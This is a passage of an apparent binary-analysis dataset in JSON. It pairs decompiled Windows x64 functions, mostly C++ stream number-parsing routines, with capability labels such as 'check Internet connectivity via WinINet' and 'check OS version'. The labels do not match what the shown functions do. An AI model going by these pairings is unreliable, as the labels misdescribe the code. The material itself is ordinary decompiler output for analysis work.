uVar10 = bStack130 + 0x7fffffffffffffff;\n    if (uVar21 == 0) {\n        uStack131 = 0;\n        if (uVar5 == 0) {\n            cStack152 = uVar16;\n            uVar19 = 0;\ncode_r0x00014004e8d2:\n            cVar6 = uVar7;\n            uVar7 = cVar6;\n            if (uVar16 < 0xb) {\n                if ((cVar6 < '0') || (cStack152 + '0' <= cVar6)) goto code_r0x00014004eb3a;\n            }\n            else if (9 < cVar6 - 0x30U) goto code_r0x00014004eb23;\n            iVar8 = uVar7 - 0x30;\n            do {\n                while( true ) {\n                    piVar4 = piStack104;\n                    if (uVar10 / uVar13 < uVar19) {\n                        uStack131 = 1;\n                    }\n                    else {\n                        uStack131 = uStack131 | uVar10 - iVar8 < uVar19 * uVar13;\n                        uVar19 = uVar19 * uVar13 + iVar8;\n                        iVar17 = iVar17 + 1;\n                    }\n                    uVar20 = piStack104[3];\n                    if (piStack104[2] < uVar20) {\n                        uVar11 = piStack104[2] + 1;\n                        piStack104[2] = uVar11;\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        uVar11 = piVar4[2];\n                        uVar20 = piVar4[3];\n                    }\n                    uStack96 = 0xffffffff;\n                    bVar23 = false;\n                    if (uVar20 <= uVar11) {\n                        iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                        if (iVar8 == -1) {\n                            piStack104 = NULL;\n                        }\n                        bVar23 = iVar8 == -1;\n                    }\n                    bVar22 = iStack112 == -1;\n                    if (((piStack120 != NULL) && (bVar22)) && (bVar22 = false,  piStack120[3] <= piStack120[2])) {\n                        iVar8 = (**(*piStack120 + 0x48))();\n                        bVar22 = iVar8 == -1;\n                        if (bVar22) {\n                            piStack120 = NULL;\n                        }\n                    }\n                    if (bVar23 == bVar22) {\n                        uVar2 = uVar5;\n                        uVar21 = 1;\n                        goto code_r0x00014004e97f;\n                    }\n                    if (piStack104 != NULL) break;\n                    if (uVar16 < 0xb) goto code_r0x00014004eb3a;\n                    cVar6 = -1;\n                    uVar7 = 0xffffffff;\ncode_r0x00014004ed14:\n                    if (5 < cVar6 + 0xbfU) goto code_r0x00014004eb3a;\n                    iVar8 = uVar7 - 0x37;\n                }\n                if (piStack104[2] < piStack104[3]) {\n                    uVar7 = *piStack104[2];\n                    goto code_r0x00014004e8d2;\n                }\n                uVar7 = (**(*piStack104 + 0x48))();\n                if (uVar7 != 0xffffffff) goto code_r0x00014004e8d2;\n                piStack104 = NULL;\n                if (uVar16 < 0xb) goto code_r0x00014004eb3a;\n                cVar6 = -1;\ncode_r0x00014004eb23:\n                if (5 < cVar6 + 0x9fU) goto code_r0x00014004ed14;\n                iVar8 = uVar7 - 0x57;\n                if (uVar7 == 0x56) goto code_r0x00014004eb3a;\n            } while( true );\n        }\n        uVar19 = 0;\n        uVar2 = 0;\n        uVar21 = uVar5;\ncode_r0x00014004e97f:\n        uVar5 = uVar2;\n        uVar2 = uVar21;\n        if (*(aiStack80[0] + -0x18) == 0) goto code_r0x00014004e992;\ncode_r0x00014004eb50:\n        uVar21 = uVar2;\n        fcn.14007da40(aiStack80, iVar17);\n        cVar6 = fcn.1400b76a0(*(iVar9 + 0x10), *(iVar9 + 0x18), aiStack80);\n        if (cVar6 == '\\0') {\n            *in_stack_00000030 = 4;\n        }\n        if (((iVar17 != 0) || (bVar3)) || (*(aiStack80[0] + -0x18) != 0)) goto code_r0x00014004eb9a;\n    }\n    else {\n        if (uVar5 != 0) {\n            uStack131 = 0;\n            uVar19 = 0;\n            uVar2 = 0;\n            uVar21 = uVar5;\n            goto code_r0x00014004e97f;\n        }\n        uVar2 = *(iVar9 + 0x20);\n        uStack131 = 0;\n        uVar19 = 0;\n        if ((uVar2 != 0) && (*(iVar9 + 0x49) == uVar7)) goto code_r0x00014004ee2c;\n        while ((*(iVar9 + 0x48) != uVar7 && (iVar12 = sub.msvcrt.dll_memchr(iVar9 + 0x72, uVar7, uVar16),  iVar12 != 0))\n              ) {\n            iVar8 = iVar12 - (iVar9 + 0x72);\n            if (0xf < iVar8) {\n                iVar8 = iVar8 + -6;\n            }\n            uVar2 = uVar21;\n            if (uVar19 <= uVar10 / uVar13) {\n                uVar20 = uVar19 * uVar13;\n                uVar19 = uVar20 + iVar8;\n                iVar17 = iVar17 + 1;\n                uVar2 = uStack131 | uVar10 - iVar8 < uVar20;\n            }\n            while( true ) {\n                uStack131 = uVar2;\n                piVar4 = piStack104;\n                uVar20 = piStack104[3];\n                if (piStack104[2] < uVar20) {\n                    uVar11 = piStack104[2] + 1;\n                    piStack104[2] = uVar11;\n                }\n                else {\n                    (**(*piStack104 + 0x50))(piStack104);\n                    uVar11 = piVar4[2];\n                    uVar20 = piVar4[3];\n                }\n                uStack96 = 0xffffffff;\n                bStack129 = false;\n                if (uVar20 <= uVar11) {\n                    iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                    if (iVar8 == -1) {\n                        piStack104 = NULL;\n                    }\n                    bStack129 = iVar8 == -1;\n                }\n                bVar23 = iStack112 == -1;\n                if (((piStack120 != NULL) && (bVar23)) && (bVar23 = false,  piStack120[3] <= piStack120[2])) {\n                    iVar8 = (**(*piStack120 + 0x48))();\n                    bVar23 = iVar8 == -1;\n                    if (bVar23) {\n                        piStack120 = NULL;\n                    }\n                }\n                uVar2 = uVar5;\n                if (bStack129 == bVar23) goto code_r0x00014004e97f;\n                uVar7 = fcn.140029e90(ppiStack144);\n                uVar2 = *(iVar9 + 0x20);\n                if ((uVar2 == 0) || (*(iVar9 + 0x49) != uVar7)) break;\ncode_r0x00014004ee2c:\n                if (iVar17 == 0) {\n                    uVar21 = 0;\n                    goto code_r0x00014004e97f;\n                }\n                fcn.14007da40(aiStack80, iVar17);\n                iVar17 = 0;\n                uVar2 = uStack131;\n            }\n        }\ncode_r0x00014004eb3a:\n        uVar21 = 0;\n        uVar2 = 0;\n        if (*(aiStack80[0] + -0x18) != 0) goto code_r0x00014004eb50;\ncode_r0x00014004e992:\n        if ((bVar3) || (iVar17 != 0)) {\ncode_r0x00014004eb9a:\n            if (uVar5 == 0) {\n                if (uStack131 == 0) {\n                    uVar10 = -uVar19;\n                    if (bStack130 == false) {\n                        uVar10 = uVar19;\n                    }\n                    *in_stack_00000038 = uVar10;\n                }\n                else {\n                    uVar10 = 0x7fffffffffffffff;\n                    if (bStack130 != false) {\n                        uVar10 = 0x8000000000000000;\n                    }\n                    *in_stack_00000038 = uVar10;\n                    *in_stack_00000030 = 4;\n                }\n                goto code_r0x00014004e9c2;\n            }\n        }\n    }\n    *in_stack_00000038 = 0;\n    *in_stack_00000030 = 4;\ncode_r0x00014004e9c2:\n    if (uVar21 != 0) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    iVar17 = **0x14010fc90;\n    *arg1 = piStack104;\n    arg1[1] = CONCAT44(uStack92, uStack96);\n    if (iVar17 == 0) {\n        iVar17 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar17 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar17 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar17 < 1) {\n        fcn.14007bf10(aiStack80[0] + -0x18, &uStack81);\n    }\n    return arg1;\n}\n",
        "token_count": 4486
    },
    "14004f0b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ** fcn.14004f0b0(int64_t **arg1)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int64_t *piVar4;\n    uint8_t uVar5;\n    char cVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    int64_t iVar13;\n    uint64_t uVar14;\n    char cVar15;\n    bool bVar16;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint64_t uVar19;\n    int32_t iVar20;\n    uint8_t uVar21;\n    bool bVar22;\n    bool bVar23;\n    bool bVar24;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint64_t *in_stack_00000038;\n    char cStack152;\n    int64_t **ppiStack144;\n    uint8_t uStack131;\n    bool bStack130;\n    int64_t *piStack120;\n    int32_t iStack112;\n    uint uStack108;\n    int64_t *piStack104;\n    uint uStack96;\n    uint uStack92;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piStack104 = *in_R8;\n    uStack96 = *(in_R8 + 1);\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    iStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    iVar9 = fcn.140026e80(in_stack_00000028 + 0xd0);\n    uVar18 = *(in_stack_00000028 + 0x18) & 0x4a;\n    if (uVar18 == 0x40) {\n        uVar17 = 8;\ncode_r0x00014004f118:\n        uVar5 = fcn.140029dd0(&piStack104, &piStack120);\n        if (uVar5 == 0) {\ncode_r0x00014004f13c:\n            ppiStack144 = &piStack104;\n            uVar7 = fcn.140029e90(ppiStack144);\n            cVar6 = uVar7;\n            bVar22 = *(iVar9 + 0x6e) == cVar6;\n            if ((bVar22) || (*(iVar9 + 0x6f) == cVar6)) {\n                cVar15 = *(iVar9 + 0x20);\n                if (((cVar15 != '\\0') && (*(iVar9 + 0x49) == cVar6)) || (*(iVar9 + 0x48) == cVar6))\n                goto code_r0x00014004f1a6;\n                fcn.14009b630(piStack104);\n                uStack96 = 0xffffffff;\n                uVar5 = fcn.140029dd0(ppiStack144, &piStack120);\n                if (uVar5 == 0) {\n                    uVar7 = fcn.140029e90(ppiStack144);\n                    cVar15 = *(iVar9 + 0x20);\n                    goto code_r0x00014004f1a6;\n                }\n                iVar20 = 0;\n                bVar3 = false;\n            }\n            else {\n                bVar22 = false;\n                cVar15 = *(iVar9 + 0x20);\ncode_r0x00014004f1a6:\n                iVar20 = 0;\n                bVar3 = false;\n                while (((piVar4 = piStack104,  cVar6 = uVar7,  cVar15 == '\\0' || (*(iVar9 + 0x49) != cVar6)) &&\n                       (*(iVar9 + 0x48) != cVar6))) {\n                    if (*(iVar9 + 0x72) == cVar6) {\n                        bVar3 = bVar3 ^ 1U | uVar17 == 10;\n                        if (!bVar3) goto code_r0x00014004f1d3;\n                        bVar24 = uVar17 == 8;\n                        if (bVar24 || uVar18 == 0) {\n                            iVar20 = 0;\n                            uVar17 = 8;\n                            bVar3 = bVar24 || uVar18 == 0;\n                        }\n                        else {\n                            iVar20 = iVar20 + 1;\n                        }\n                    }\n                    else {\n                        if (!bVar3) break;\ncode_r0x00014004f1d3:\n                        if ((*(iVar9 + 0x70) != cVar6) && (*(iVar9 + 0x71) != cVar6)) {\n                            uVar5 = 0;\n                            bVar3 = true;\n                            goto code_r0x00014004f25b;\n                        }\n                        uVar5 = uVar18 == 0 || uVar17 == 0x10;\n                        if (uVar18 != 0 && uVar17 != 0x10) {\n                            bVar3 = true;\n                            uVar18 = uVar17;\n                            goto code_r0x00014004f270;\n                        }\n                        iVar20 = 0;\n                        uVar17 = 0x10;\n                        bVar3 = false;\n                    }\n                    if (piStack104[2] < piStack104[3]) {\n                        uVar10 = piStack104[2] + 1;\n                        uStack96 = 0xffffffff;\n                        piStack104[2] = uVar10;\n                        if (uVar10 < piStack104[3]) goto code_r0x00014004f230;\ncode_r0x00014004f628:\n                        uStack96 = 0xffffffff;\n                        iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                        if (iVar8 != -1) goto code_r0x00014004f230;\n                        piStack104 = NULL;\n                        bVar24 = true;\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        uStack96 = 0xffffffff;\n                        if (piVar4[3] <= piVar4[2]) goto code_r0x00014004f628;\ncode_r0x00014004f230:\n                        bVar24 = false;\n                    }\n                    bVar16 = piStack120 != NULL && iStack112 == -1;\n                    bVar23 = iStack112 == -1;\n                    if (bVar16) {\n                        if ((piStack120[2] < piStack120[3]) || (iVar8 = (**(*piStack120 + 0x48))(),  iVar8 != -1)) {\n                            bVar23 = false;\n                        }\n                        else {\n                            piStack120 = NULL;\n                            bVar23 = bVar16;\n                        }\n                    }\n                    if (bVar24 == bVar23) {\n                        uVar5 = 1;\n                        goto code_r0x00014004f25b;\n                    }\n                    if (piStack104 == NULL) {\ncode_r0x00014004f670:\n                        uVar7 = 0xffffffff;\n                    }\n                    else if (piStack104[2] < piStack104[3]) {\n                        uVar7 = *piStack104[2];\n                    }\n                    else {\n                        uVar7 = (**(*piStack104 + 0x48))();\n                        if (uVar7 == 0xffffffff) {\n                            piStack104 = NULL;\n                            goto code_r0x00014004f670;\n                        }\n                    }\n                    if (!bVar3) break;\n                    cVar15 = *(iVar9 + 0x20);\n                }\n                uVar5 = 0;\n            }\ncode_r0x00014004f25b:\n            uVar18 = uVar17;\n            if (uVar17 == 0x10) goto code_r0x00014004f466;\n        }\n        else {\n            bVar22 = false;\n            uVar7 = 0;\n            iVar20 = 0;\n            bVar3 = false;\n            uVar18 = uVar17;\n        }\n    }\n    else {\n        uVar17 = 10;\n        if (uVar18 != 8) goto code_r0x00014004f118;\n        uVar17 = 0x10;\n        uVar5 = fcn.140029dd0(&piStack104, &piStack120);\n        if (uVar5 == 0) goto code_r0x00014004f13c;\n        bVar22 = false;\n        uVar7 = 0;\n        iVar20 = 0;\n        bVar3 = false;\ncode_r0x00014004f466:\n        uVar17 = 0x16;\n        uVar18 = 0x10;\n    }\ncode_r0x00014004f270:\n    ppiStack144 = &piStack104;\n    aiStack80[0] = fcn.14007b890(0, 0);\n    if (*(iVar9 + 0x20) != '\\0') {\n        fcn.14007d790(aiStack80, 0x20);\n    }\n    uVar14 = uVar18;\n    uVar21 = *(iVar9 + 0x88);\n    uVar10 = SUB168((ZEXT816(0) << 0x40 | ZEXT816(0xffffffffffffffff)) / ZEXT816(uVar14), 0);\n    if (uVar21 == 0) {\n        uStack131 = 0;\n        if (uVar5 == 0) {\n            cStack152 = uVar17;\n            uVar11 = 0;\ncode_r0x00014004f2dc:\n            cVar6 = uVar7;\n            uVar7 = cVar6;\n            if (uVar17 < 0xb) {\n                if ((cVar6 < '0') || (cStack152 + '0' <= cVar6)) goto code_r0x00014004f52a;\n            }\n            else if (9 < cVar6 - 0x30U) goto code_r0x00014004f513;\n            iVar8 = uVar7 - 0x30;\n            do {\n                while( true ) {\n                    piVar4 = piStack104;\n                    if (uVar10 < uVar11) {\n                        uStack131 = 1;\n                    }\n                    else {\n                        uVar19 = uVar11 * uVar14;\n                        uVar11 = iVar8 + uVar19;\n                        uStack131 = uStack131 | CARRY8(iVar8, uVar19);\n                        iVar20 = iVar20 + 1;\n                    }\n                    uVar19 = piStack104[3];\n                    if (piStack104[2] < uVar19) {\n                        uVar12 = piStack104[2] + 1;\n                        piStack104[2] = uVar12;\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        uVar12 = piVar4[2];\n                        uVar19 = piVar4[3];\n                    }\n                    uStack96 = 0xffffffff;\n                    bVar24 = false;\n                    if (uVar19 <= uVar12) {\n                        iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                        if (iVar8 == -1) {\n                            piStack104 = NULL;\n                        }\n                        bVar24 = iVar8 == -1;\n                    }\n                    bVar23 = iStack112 == -1;\n                    if (((piStack120 != NULL) && (bVar23)) && (bVar23 = false,  piStack120[3] <= piStack120[2])) {\n                        iVar8 = (**(*piStack120 + 0x48))();\n                        bVar23 = iVar8 == -1;\n                        if (bVar23) {\n                            piStack120 = NULL;\n                        }\n                    }\n                    if (bVar23 == bVar24) {\n                        uVar2 = uVar5;\n                        uVar21 = 1;\n                        goto code_r0x00014004f381;\n                    }\n                    if (piStack104 != NULL) break;\n                    if (uVar17 < 0xb) goto code_r0x00014004f52a;\n                    cVar6 = -1;\n                    uVar7 = 0xffffffff;\ncode_r0x00014004f6e4:\n                    if (5 < cVar6 + 0xbfU) goto code_r0x00014004f52a;\n                    iVar8 = uVar7 - 0x37;\n                }\n                if (piStack104[2] < piStack104[3]) {\n                    uVar7 = *piStack104[2];\n                    goto code_r0x00014004f2dc;\n                }\n                uVar7 = (**(*piStack104 + 0x48))();\n                if (uVar7 != 0xffffffff) goto code_r0x00014004f2dc;\n                piStack104 = NULL;\n                if (uVar17 < 0xb) goto code_r0x00014004f52a;\n                cVar6 = -1;\ncode_r0x00014004f513:\n                if (5 < cVar6 + 0x9fU) goto code_r0x00014004f6e4;\n                iVar8 = uVar7 - 0x57;\n                if (uVar7 == 0x56) goto code_r0x00014004f52a;\n            } while( true );\n        }\n        uVar11 = 0;\n        uVar2 = 0;\n        uVar21 = uVar5;\ncode_r0x00014004f381:\n        uVar5 = uVar2;\n        uVar2 = uVar21;\n        if (*(aiStack80[0] + -0x18) == 0) goto code_r0x00014004f391;\ncode_r0x00014004f53d:\n        uVar21 = uVar2;\n        fcn.14007da40(aiStack80, iVar20);\n        cVar6 = fcn.1400b76a0(*(iVar9 + 0x10), *(iVar9 + 0x18), aiStack80);\n        if (cVar6 == '\\0') {\n            *in_stack_00000030 = 4;\n        }\n        if (((iVar20 != 0) || (bVar3)) || (*(aiStack80[0] + -0x18) != 0)) goto code_r0x00014004f581;\n    }\n    else {\n        if (uVar5 != 0) {\n            uStack131 = 0;\n            uVar11 = 0;\n            uVar2 = 0;\n            uVar21 = uVar5;\n            goto code_r0x00014004f381;\n        }\n        uVar2 = *(iVar9 + 0x20);\n        uStack131 = 0;\n        uVar11 = 0;\n        if ((uVar2 != 0) && (*(iVar9 + 0x49) == uVar7)) goto code_r0x00014004f7f4;\n        while ((*(iVar9 + 0x48) != uVar7 && (iVar13 = sub.msvcrt.dll_memchr(iVar9 + 0x72, uVar7, uVar17),  iVar13 != 0))\n              ) {\n            iVar8 = iVar13 - (iVar9 + 0x72);\n            if (0xf < iVar8) {\n                iVar8 = iVar8 + -6;\n            }\n            uVar2 = uVar21;\n            if (uVar11 <= uVar10) {\n                uVar19 = uVar11 * uVar14;\n                uVar11 = iVar8 + uVar19;\n                iVar20 = iVar20 + 1;\n                uVar2 = uStack131 | CARRY8(iVar8, uVar19);\n            }\n            while( true ) {\n                uStack131 = uVar2;\n                piVar4 = piStack104;\n                uVar19 = piStack104[3];\n                if (piStack104[2] < uVar19) {\n                    uVar12 = piStack104[2] + 1;\n                    piStack104[2] = uVar12;\n                }\n                else {\n                    (**(*piStack104 + 0x50))(piStack104);\n                    uVar12 = piVar4[2];\n                    uVar19 = piVar4[3];\n                }\n                uStack96 = 0xffffffff;\n                bStack130 = false;\n                if (uVar19 <= uVar12) {\n                    iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                    if (iVar8 == -1) {\n                        piStack104 = NULL;\n                    }\n                    bStack130 = iVar8 == -1;\n                }\n                bVar24 = iStack112 == -1;\n                if (((piStack120 != NULL) && (bVar24)) && (bVar24 = false,  piStack120[3] <= piStack120[2])) {\n                    iVar8 = (**(*piStack120 + 0x48))();\n                    bVar24 = iVar8 == -1;\n                    if (bVar24) {\n                        piStack120 = NULL;\n                    }\n                }\n                uVar2 = uVar5;\n                if (bStack130 == bVar24) goto code_r0x00014004f381;\n                uVar7 = fcn.140029e90(ppiStack144);\n                uVar2 = *(iVar9 + 0x20);\n                if ((uVar2 == 0) || (*(iVar9 + 0x49) != uVar7)) break;\ncode_r0x00014004f7f4:\n                if (iVar20 == 0) {\n                    uVar21 = 0;\n                    goto code_r0x00014004f381;\n                }\n                fcn.14007da40(aiStack80, iVar20);\n                iVar20 = 0;\n                uVar2 = uStack131;\n            }\n        }\ncode_r0x00014004f52a:\n        uVar21 = 0;\n        uVar2 = 0;\n        if (*(aiStack80[0] + -0x18) != 0) goto code_r0x00014004f53d;\ncode_r0x00014004f391:\n        if ((iVar20 != 0) || (bVar3)) {\ncode_r0x00014004f581:\n            if (uVar5 == 0) {\n                if (uStack131 == 0) {\n                    if (bVar22) {\n                        uVar11 = -uVar11;\n                    }\n                    *in_stack_00000038 = uVar11;\n                }\n                else {\n                    *in_stack_00000038 = 0xffffffffffffffff;\n                    *in_stack_00000030 = 4;\n                }\n                goto code_r0x00014004f3c1;\n            }\n        }\n    }\n    *in_stack_00000038 = 0;\n    *in_stack_00000030 = 4;\ncode_r0x00014004f3c1:\n    if (uVar21 != 0) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    *arg1 = piStack104;\n    arg1[1] = CONCAT44(uStack92, uStack96);\n    if (**0x14010fc90 == 0) {\n        iVar20 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar20 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar20 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar20 < 1) {\n        fcn.14007bf10(aiStack80[0] + -0x18, &uStack81);\n    }\n    return arg1;\n}\n",
        "token_count": 4451
    },
    "14004fa8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.14004fa80(uint *arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int32_t *piVar3;\n    int64_t *piVar4;\n    uint8_t uVar5;\n    char cVar6;\n    uint8_t uVar7;\n    char cVar8;\n    char cVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int64_t iVar12;\n    uint64_t uVar13;\n    int64_t iVar14;\n    uint32_t uVar15;\n    bool bVar16;\n    ulong arg2;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint8_t uVar17;\n    int32_t iVar18;\n    uint8_t uVar19;\n    bool bVar20;\n    bool bVar21;\n    int64_t in_stack_00000028;\n    uint *in_stack_00000030;\n    int64_t *in_stack_00000038;\n    uint8_t uStack145;\n    int64_t *piStack120;\n    int32_t iStack112;\n    uint uStack108;\n    ulong uStack104;\n    uint32_t uStack96;\n    uint uStack92;\n    int64_t aiStack80 [2];\n    \n    uStack104 = *in_R8;\n    uStack96 = *(in_R8 + 1);\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    iStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    iVar12 = fcn.140026e80(in_stack_00000028 + 0xd0);\n    uVar5 = fcn.140029dd0(&uStack104, &piStack120);\n    if (uVar5 == 0) {\n        uVar10 = fcn.140029e90(&uStack104);\n        cVar6 = *(iVar12 + 0x20);\n        cVar8 = *(iVar12 + 0x6f);\n        cVar9 = uVar10;\n        if (cVar8 == cVar9) {\n            if (cVar6 == '\\0') {\n                uVar15 = 0x2b;\n                cVar8 = *(iVar12 + 0x48);\n                goto joined_r0x000140050617;\n            }\ncode_r0x00014005057a:\n            if ((*(iVar12 + 0x49) == cVar9) || (*(iVar12 + 0x48) == cVar9)) goto code_r0x000140050358;\n            uVar15 = (cVar8 != cVar9) + 0x2b + (cVar8 != cVar9);\n        }\n        else {\n            if (*(iVar12 + 0x6e) != cVar9) goto code_r0x000140050358;\n            if (cVar6 != '\\0') goto code_r0x00014005057a;\n            uVar15 = 0x2d;\n            cVar8 = *(iVar12 + 0x48);\njoined_r0x000140050617:\n            if (cVar8 == cVar9) goto code_r0x000140050358;\n        }\n        fcn.14007da40(in_stack_00000038, uVar15);\n        fcn.14009b630(uStack104);\n        uStack96 = 0xffffffff;\n        uVar19 = fcn.140029dd0(&uStack104, &piStack120);\n        if (uVar19 == 0) {\n            uVar10 = fcn.140029e90(&uStack104);\n            cVar6 = *(iVar12 + 0x20);\ncode_r0x000140050358:\n            piVar3 = *0x14010fc90;\n            uVar17 = 0;\n            iVar18 = 0;\n            do {\n                cVar8 = uVar10;\n                if ((((cVar6 != '\\0') && (uVar19 = uVar5,  *(iVar12 + 0x49) == cVar8)) ||\n                    (uVar19 = uVar5,  *(iVar12 + 0x48) == cVar8)) || (*(iVar12 + 0x72) != cVar8))\n                goto code_r0x00014004fb00;\n                if (uVar17 == 0) {\n                    iVar14 = *in_stack_00000038;\n                    iVar1 = *(iVar14 + -0x18);\n                    uVar13 = iVar1 + 1;\n                    if (*(iVar14 + -0x10) < uVar13) {\ncode_r0x000140050446:\n                        fcn.14007d790(in_stack_00000038, uVar13);\n                    }\n                    else {\n                        if (*piVar3 == 0) {\n                            iVar11 = *(iVar14 + -8);\n                        }\n                        else {\n                            iVar11 = *(iVar14 + -8);\n                        }\n                        if (0 < iVar11) goto code_r0x000140050446;\n                    }\n                    *(*in_stack_00000038 + *(*in_stack_00000038 + -0x18)) = 0x30;\n                    iVar14 = *in_stack_00000038;\n                    *(iVar14 + -8) = 0;\n                    *(iVar14 + -0x18) = uVar13;\n                    *(iVar14 + 1 + iVar1) = 0;\n                }\n                piVar4 = uStack104;\n                iVar18 = iVar18 + 1;\n                if (uStack104[2] < uStack104[3]) {\n                    uVar13 = uStack104[2] + 1;\n                    uStack96 = 0xffffffff;\n                    uStack104[2] = uVar13;\n                    if (uVar13 < uStack104[3]) goto code_r0x0001400503bf;\ncode_r0x0001400504c8:\n                    uStack96 = 0xffffffff;\n                    iVar11 = (**(*piVar4 + 0x48))(piVar4);\n                    if (iVar11 != -1) goto code_r0x0001400503bf;\n                    uStack104 = NULL;\n                    bVar21 = true;\n                }\n                else {\n                    (**(*uStack104 + 0x50))(uStack104);\n                    uStack96 = 0xffffffff;\n                    if (piVar4[3] <= piVar4[2]) goto code_r0x0001400504c8;\ncode_r0x0001400503bf:\n                    bVar21 = false;\n                }\n                bVar16 = piStack120 != NULL && iStack112 == -1;\n                bVar20 = iStack112 == -1;\n                if (bVar16) {\n                    if ((piStack120[2] < piStack120[3]) || (iVar11 = (**(*piStack120 + 0x48))(),  iVar11 != -1)) {\n                        bVar20 = false;\n                    }\n                    else {\n                        piStack120 = NULL;\n                        bVar20 = bVar16;\n                    }\n                }\n                if (bVar21 == bVar20) goto code_r0x0001400503e1;\n                if (uStack104 == NULL) {\ncode_r0x000140050510:\n                    uVar10 = 0xffffffff;\n                }\n                else if (uStack104[2] < uStack104[3]) {\n                    uVar10 = *uStack104[2];\n                }\n                else {\n                    uVar10 = (**(*uStack104 + 0x48))();\n                    if (uVar10 == 0xffffffff) {\n                        uStack104 = NULL;\n                        goto code_r0x000140050510;\n                    }\n                }\n                cVar6 = *(iVar12 + 0x20);\n                uVar17 = 1;\n            } while( true );\n        }\n        uVar17 = 0;\n        iVar18 = 0;\n    }\n    else {\n        uVar10 = 0;\n        iVar18 = 0;\n        uVar17 = 0;\n        uVar19 = uVar5;\n    }\n    goto code_r0x00014004fb00;\ncode_r0x00014004fd06:\n    do {\n        cVar8 = uVar10;\n        if (*(iVar12 + 0x48) == cVar8) {\n            uStack145 = uStack145 | uVar19;\n            if (uStack145 != 0) goto code_r0x0001400505ef;\n            if (*(aiStack80[0] + -0x18) != 0) {\n                fcn.14007da40(aiStack80, cVar6);\n            }\n            iVar14 = *in_stack_00000038;\n            iVar1 = *(iVar14 + -0x18);\n            uVar13 = iVar1 + 1;\n            if (*(iVar14 + -0x10) < uVar13) {\ncode_r0x00014004feec:\n                fcn.14007d790(in_stack_00000038, uVar13);\n            }\n            else {\n                if (**0x14010fc90 == 0) {\n                    iVar11 = *(iVar14 + -8);\n                }\n                else {\n                    iVar11 = *(iVar14 + -8);\n                }\n                if (0 < iVar11) goto code_r0x00014004feec;\n            }\n            *(*in_stack_00000038 + *(*in_stack_00000038 + -0x18)) = 0x2e;\n            iVar14 = *in_stack_00000038;\n            *(iVar14 + -8) = 0;\n            *(iVar14 + -0x18) = uVar13;\n            *(iVar14 + 1 + iVar1) = 0;\n            uVar19 = uVar5;\n            goto code_r0x00014004fd9d;\n        }\n        iVar14 = sub.msvcrt.dll_memchr(iVar12 + 0x72);\n        if (iVar14 != 0) {\n            iVar1 = *in_stack_00000038;\n            iVar2 = *(iVar1 + -0x18);\n            uVar13 = iVar2 + 1;\n            if (*(iVar1 + -0x10) < uVar13) {\ncode_r0x00014004fd61:\n                fcn.14007d790(in_stack_00000038, uVar13);\n            }\n            else {\n                if (**0x14010fc90 == 0) {\n                    iVar11 = *(iVar1 + -8);\n                }\n                else {\n                    iVar11 = *(iVar1 + -8);\n                }\n                if (0 < iVar11) goto code_r0x00014004fd61;\n            }\n            iVar18 = iVar18 + 1;\n            *(*in_stack_00000038 + *(*in_stack_00000038 + -0x18)) = (iVar14 - (iVar12 + 0x72)) + '0';\n            iVar14 = *in_stack_00000038;\n            *(iVar14 + -8) = 0;\n            *(iVar14 + -0x18) = uVar13;\n            *(iVar14 + 1 + iVar2) = 0;\n            uVar17 = uVar5;\n            goto code_r0x00014004fd9d;\n        }\n        if ((*(iVar12 + 0x80) != cVar8) && (*(iVar12 + 0x86) != cVar8)) goto code_r0x00014004fdf6;\n        uVar17 = uVar17 & (uStack145 ^ 1);\n        if (uVar17 == 0) goto code_r0x00014004fdf6;\n        if ((*(aiStack80[0] + -0x18) != 0) && (uVar19 == 0)) {\n            fcn.14007da40(aiStack80, cVar6);\n        }\n        iVar14 = *in_stack_00000038;\n        iVar1 = *(iVar14 + -0x18);\n        uVar13 = iVar1 + 1;\n        if (*(iVar14 + -0x10) < uVar13) {\ncode_r0x00014004ffbc:\n            fcn.14007d790(in_stack_00000038, uVar13);\n        }\n        else {\n            if (**0x14010fc90 == 0) {\n                iVar11 = *(iVar14 + -8);\n            